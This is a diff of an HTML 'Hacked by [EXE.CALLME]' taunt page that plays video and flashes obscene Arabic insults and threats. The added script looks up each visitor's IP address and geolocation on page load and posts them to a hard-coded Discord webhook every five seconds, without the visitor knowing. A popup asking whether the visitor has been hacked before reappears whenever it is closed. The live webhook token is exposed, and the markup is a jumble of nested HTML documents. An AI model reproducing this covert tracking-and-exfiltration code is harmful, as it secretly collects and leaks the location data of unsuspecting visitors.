@@ -1,181 +1,421 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
+<!-- saved from url=(0029)https://50sh.github.io/index/ -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <title>CALLME</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
-      margin: 0;
-      padding: 0;
-      width: 100%;
-      height: 100vh;
-      background-color: black;
-      color: white;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      overflow: hidden;
+        background-color: #000000; /* black background */
+        margin: 0;
+        padding: 0;
+        width: 95%;
+        height: 100vh;
+        overflow: hidden;
+        font-family: Arial, sans-serif;
+        text-align: center;
+        padding-top: 50px;
     }
 
     video {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100vh;
-      object-fit: cover;
-      z-index: -1;
-    }
-
-    audio {
-      display: none;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100vh;
+        object-fit: cover;
+        autoplay: autoplay;
     }
 
     #photo {
-      width: 100%;
-      max-width: 500px;
-      height: auto;
+        width: 13%;
+        max-width: 200px;
+        height: auto; /* Corrected height to auto for maintaining aspect ratio */
     }
 
-    .animated-text {
-      animation: lightning 1s linear infinite;
+    @keyframes moveUP {
+        from { transform: translateY(0); }
+        to { transform: translateY(30px); }
     }
 
-    @keyframes lightning {
-      0% { color: red; }
-      50% { color: black; }
-      100% { color: white; }
+    .animated-image {
+        animation: moveUP 2s infinite alternate;
     }
 
-    #nameDisplay {
-      margin-top: 20px;
-      font-size: 30px;
+    .image-container {
+        position: relative;
+        display: flex;
+        justify-content: flex-end;
+        align-items: center;
+        height: 200px; /* Adjust this height as needed */
     }
 
-    .cmd-text-container {
-      margin-top: 20px;
+    .image-container img {
+        max-width: 100%;
+        max-height: 100%;
     }
 
-    .cmd-text {
-      font-size: 19px;
-      color: black;
-      -webkit-text-stroke: 1px white;
-      white-space: nowrap;
-      animation: scrollText 20s linear infinite;
-    }
+    .name {
+        font-size: 24px; /* Change the size of the name */
+        position: absolute; /* Allows you to place the name anywhere */
+        top: 100px; /* Change the vertical position of the name */
+        left: 800px; /* Change the horizontal position of the name */
+        color: white; /* Default color for the name */
+   }
 
-    @keyframes scrollText {
-      0% { transform: translateX(100%); }
-      100% { transform: translateX(-100%); }
+   .error-screen {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.8);
+        color: white;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-size: 24px;
+        z-index: 1000;
     }
+    .hidden {
+        display: none;
+    }
+    
+   
 
-    .json-data {
-      white-space: pre;
-      text-shadow: -1px -1px 0 black, 1px -1px 0 black,
-                   -1px 1px 0 black, 1px 1px 0 black;
-    }
 
-    #messageForm {
-      margin-top: 30px;
-    }
-  </style>
+</style>
 </head>
 <body>
 
-  <!-- Background Video -->
-  <video autoplay muted loop>
-    <source src="https://cdn.discordapp.com/attachments/1166669805768679495/1265074516887863366/2024-07-21_23-35-43_1.mp4" type="video/mp4">
-    Your browser does not support the video tag.
-  </video>
 
-  <!-- Background Audio -->
-  <audio autoplay loop>
-    <source src="https://cdn.discordapp.com/attachments/1166669805768679495/1265074157025103872/2024-07-21_23-35-43_1.mp3" type="audio/mpeg">
-    Your browser does not support the audio tag.
-  </audio>
+    <div id="error-screen" class="error-screen hidden">
+        <div>
+            <p>جربت تتهكر قبل كده؟</p>
+            <button id="close-button">Close</button>
+        </div>
+    </div>
+    
+   
 
-  <!-- Animated Text -->
-  <h3 class="animated-text">جاهزين تتناكو ؟</h3>
+    <div class="image-container">
+        <img id="photo" src="https://cdn.discordapp.com/attachments/1087917650472095794/1280201323316248617/wallpaperflare.com_wallpaper_2.jpg?ex=680670e4&is=68051f64&hm=e5e53724748b82a4c8c1f95369fcf9f0c3b8643118f178337816a2cddffea9f2&" alt="Centered Right Photo" class="animated-image">
+    </div>
 
-  <!-- Rotating Name -->
-  <h1 id="nameDisplay">CALLME</h1>
+ </body>
+ </html>
 
-  <!-- Rotating Image -->
-  <img id="photo" src="" alt="Photo">
 
-  <!-- IP Info -->
-  <p id="ip-address">
-    <span>Your IP Address: </span>
-    <span id="ip-address-value">Unable to fetch IP address.</span>
-  </p>
 
-  <h3>Your IP Info:</h3>
-  <pre id="ip-info" class="json-data">Unable to fetch IP information.</pre>
 
-  <!-- Scrolling Text -->
-  <div class="cmd-text-container">
-    <div class="cmd-text">تـــــــم النيـــــــك</div>
-  </div>
 
-  <!-- Feedback Form -->
-  <h2>Feedback</h2>
-  <form id="messageForm">
-    <label for="message">Message:</label><br>
-    <input type="text" id="message" name="message"><br><br>
-    <button type="submit">Send Message</button>
-  </form>
+<script>
+    var names = [
 
-  <!-- Scripts -->
-  <script>
-    const photos = [
-      "https://cdn.discordapp.com/attachments/1166669805768679495/1264836924116566088/image.png",
-      "https://cdn.discordapp.com/avatars/1072701097350795375/27252841227e78983dc8d898b1ae8c35.png?size=1024",
-    ];
+    ]
 
-    let currentPhotoIndex = 0;
-    const photoElement = document.getElementById('photo');
+    var nameIndex = 0;
 
-    function changePhoto() {
-      photoElement.src = photos[currentPhotoIndex];
-      currentPhotoIndex = (currentPhotoIndex + 1) % photos.length;
+    function changeNames() {
+        var currentName = names[nameIndex];
+        document.getElementById("name").textContent = currentName.name;
+        document.getElementById("name").style.color = currentName.color;
+        nameIndex = (nameIndex + 1) % names.length;
     }
 
-    setInterval(changePhoto, 1000);
-    changePhoto();
+    // Change the names every 1 second
+    setInterval(changeNames, 1000);
+</script>
 
-    const namesAndColors = [
-      { name: "Hacked by [EXE.CALLME]", color: "black" },
-      { name: "Hacked by [exe.6.eldokSH]", color: "red" }
-    ];
+<p align="center">
 
-    let index = 0;
-    function changeName() {
-      const el = document.getElementById("nameDisplay");
-      el.textContent = namesAndColors[index].name;
-      el.style.color = namesAndColors[index].color;
-      index = (index + 1) % namesAndColors.length;
+
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Change Name Every Second with Custom Color</title>
+<style>
+
+BODY {
+    font-family: Arial, sans-serif;
+    text-align: center;
+    padding-top: 50px;
+}
+</style>
+</head>
+<body>
+
+
+    <h1 id="nameDisplay">CALLME</h1>
+
+<script>
+  const namesAndColors = [
+    { name: "Hacked by [EXE.CALLME]", color: "purple" },
+  ];
+
+  let index = 0;
+
+  // Function to change the name every second
+  function changeName() {
+    const nameDisplay = document.getElementById("nameDisplay");
+    nameDisplay.textContent = namesAndColors[index].name;
+    nameDisplay.style.color = namesAndColors[index].color;
+    nameDisplay.style.position = "absolute"; // Change the position to absolute
+    nameDisplay.style.top = "50px"; // Adjust the top position as needed
+    nameDisplay.style.left = "973px"; // Adjust the left position as needed
+    nameDisplay.style.fontSize = "30px"; // Change the font size as needed
+    nameDisplay.style.transform = "translate(-50%, -50%)"; // Center the text if necessary
+    index = (index + 1) % namesAndColors.length; // Move to the next name, wrap around if needed
+  }
+
+  changeName();
+  setInterval(changeName, 1000); // Change name every 1 second (1000 milliseconds)
+</script>
+
+
+    <title>?، </title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            color: #000000;
+            background-color: #000000;
+            overflow: hidden;
+        }
+
+        h1, h3 {
+            color: #ffffff;
+        }
+
+        
+
+        
+
+        .cmd-text-container {
+            position: relative;
+        }
+
+        .cmd-text {
+            color: #fdf0f0;
+            font-size: 9px;
+            font-family: Arial, sans-serif;
+            white-space: nowrap;
+            position: static;
+            animation: scrollText 20s linear infinite;
+            transform: translateX(10%);
+            -webkit-text-stroke: 1px rgb(255, 255, 255);
+            text-stroke: 1px rgb(240, 240, 240);
+        }
+
+        .gray-text {
+            color: #000000;
+            outline: 1px solid #000000;
+        }
+
+        .json-data {
+            font-family: Arial, sans-serif;
+            color: rgb(255, 0, 0);
+            text-shadow: -1px -1px 0 black, 1px -1px 0 black, -1px 1px 0 black, 1px 1px 0 black;
+            position: absolute; /* or relative, fixed, or sticky depending on your needs */
+            top: 300px; /* adjust as needed */
+            left: 1000px; /* adjust as needed */
+        }
+
+
+        .json-data span {
+            color: black;
+        }
+
+        @keyframes scrollText {
+                50% {
+                transform: translateX(-10%);
+            }
+                30% {
+                transform: translateX(20%);
+            }    
+        }
+
+
+        .cmd-text:hover {
+            animation-play-state: PLAY;
+        }
+
+        video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+
+        }
+
+        /* Hide the audio controls */
+        audio
+    </style>
+
+
+
+
+
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Animated Text</title>
+    <style>
+        @keyframes lightning {
+            0% { color: rgb(255, 0, 0); }
+            50% { color: rgb(0, 0, 0); }
+            100% { color: white; }
+        }
+
+        .animated-text {
+            animation: lightning 1s linear infinite;
+            font-size: 26px; /* Change the font size */
+            position: absolute; /* Allows you to position the text */
+            top: 15%; /* Change the vertical position */
+            left: 51%; /* Change the horizontal position */
+            transform: translate(-50%, -50%); /* Center the text */
+        }
+
+        .animated-text {
+            animation: lightning 1s linear infinite;
+        }
+    </style>
+
+
+    <h4 style="position: relative; left: -30%; top: 402px; font-size: 28px; color: rgb(255, 4, 4); animation: flashing 1s infinite;">و بنطglock w alfredoلو انت فاكرني مت ف انا علي ام </h4>
+
+    <h5 style="position: relative; left: -39%; top: 548px; font-size: 32px; color: rgb(255, 4, 4); animation: flashing 1s infinite;">تم النكح يا كسمك</h5>
+    
+    <h3 class="animated-text">***بيــــــــــــــــــــــــــــــــــــاااااان هاااااام***</h3>
+
+
+    <p id="ip-address">
+        <span style="position: relative; left: 14%; top: -210px;color: rgb(255, 255, 255);">Your IP Info :</span>
+        <span id="ip-address-value" style="position: relative; left: 14%; top: -210px;color: rgb(255, 255, 255); font-size: 17px;">طلعت مش بعرف.</span>
+    </p>
+
+    <h3 style="position: relative; left: 14%; top: -210px; color: rgb(255, 255, 255); animation: flashing 1s infinite;">Your IP Info ⇊</h3>
+    <pre id="ip-info" "position: relative; left: 14%; top: -270px; color: rgb(255, 255, 255);" class="json-data">طلعت مش بعرف.</pre>
+    <div class="cmd-text-container" style="position: relative; top: -100px;">
+    <div class="cmd-text" style="position: relative; left: 14%; top: 475px; font-size: 30px; text-stroke: 20px black; color: black; animation: scrollText 15s infinite;">
+        سيتم نكح و نيك جميع من في السيرفر كسمك
+    </div>
+</div>
+
+
+    <!-- Hidden audio element with autoplay -->
+
+
+
+
+    <html lang="en">
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Autoplay Video with Sound</title>
+    </head>
+    <body>
+      <video autoplay muted LOOP>
+        <source src="https://cdn.discordapp.com/attachments/1087917650472095794/1363557207072837712/y2mate.com_-__360p.mp4?ex=6806771b&is=6805259b&hm=31d5791be9865264fb7af575e1b4faace518bc7d00b952eb58bebd736e0be42c&" type="video/mp4">
+        <!-- You can add additional source elements for different formats -->
+        Your browser does not support the video tag.
+      </video>
+
+      <audio autoplay LOOP>
+        <source src="https://cdn.discordapp.com/attachments/1087917650472095794/1363557207072837712/y2mate.com_-__360p.mp4?ex=6806771b&is=6805259b&hm=31d5791be9865264fb7af575e1b4faace518bc7d00b952eb58bebd736e0be42c&" type="audio/mpeg">
+            <!-- You can add additional source elements for different audio formats -->
+            Your browser does not support the audio tag.
+        </audio>
+    </body>
+    </html>
+    
+</form>
+
+
+
+
+
+<!-- Script to fetch IP address and information -->
+<script>
+    
+    // Function to fetch IP address and information
+    function fetchIPAndInfo() {
+        fetch('https://api.ipify.org/?format=json')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('ip-address-value').textContent = data.ip;
+                return data.ip;
+            })
+            .then(ip => fetch(`https://ipinfo.io/${ip}/json`))
+            .then(response => response.json())
+            .then(ipInfoData => {
+                document.getElementById('ip-info').textContent = JSON.stringify(ipInfoData, null, 2);
+                // Once IP info is fetched, start sending messages
+                autoSendMessages();
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
+                document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
+            });
     }
 
-    setInterval(changeName, 1000);
-    changeName();
+    // Function to send a message to Discord
+    function sendMessage(message) {
+        const webhookUrl = 'https://discordapp.com/api/webhooks/1265115299783381033/BZ8l-g0AaTyyy2RTWTkzry9xtA01ZsnkUVnSZykrqHe-mQkoFph3HRsM5AUh_KCo1-DH';
 
-    document.getElementById('messageForm').addEventListener('submit', function(event) {
-      event.preventDefault();
-      const message = document.getElementById('message').value.trim();
-      if (!message) return alert('Message cannot be empty.');
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ content: message }),
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            console.log('Message sent successfully:', message);
+        })
+        .catch(error => console.error('Error sending message:', error));
+    }
 
-      fetch('https://discordapp.com/api/webhooks/1265115299783381033/BZ8l-g0AaTyyy2RTWTkzry9xtA01ZsnkUVnSZykrqHe-mQkoFph3HRsM5AUh_KCo1-DH', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: message })
-      })
-      .then(response => {
-        if (!response.ok) throw new Error('Failed to send');
-        alert('Thanks, CALLME!');
-        document.getElementById('message').value = '';
-      })
-      .catch(console.error);
-    });
-  </script>
+
+
+
+
+    // Function to send a message containing IP info every 5 seconds
+    function autoSendMessages() {
+        setInterval(() => {
+            // Prepare message with IP info
+            const message = `IP Address: ${document.getElementById('ip-address-value').textContent}\nIP Info: ${document.getElementById('ip-info').textContent}`;
+            
+            // Send message to Discord
+            sendMessage(message);
+        }, 5000); // Send a message every 5 seconds (5000 milliseconds)
+    }
+
+    // Initial fetch of IP address and information
+    fetchIPAndInfo();
+
+
+  
+    function showErrorScreen() {
+            document.getElementById('error-screen').classList.remove('hidden');
+        }
+
+        function closeErrorScreen() {
+            document.getElementById('error-screen').classList.add('hidden');
+            setTimeout(showErrorScreen, 2000); // Re-show the error screen after 1 second
+        }
+
+        document.getElementById('close-button').addEventListener('click', closeErrorScreen);
+
+        // Initial display of the error screen
+        window.addEventListener('load', function() {
+            setTimeout(showErrorScreen, 2000);
+    }   );
+  
+
+</script>
+
 </body>
 </html>
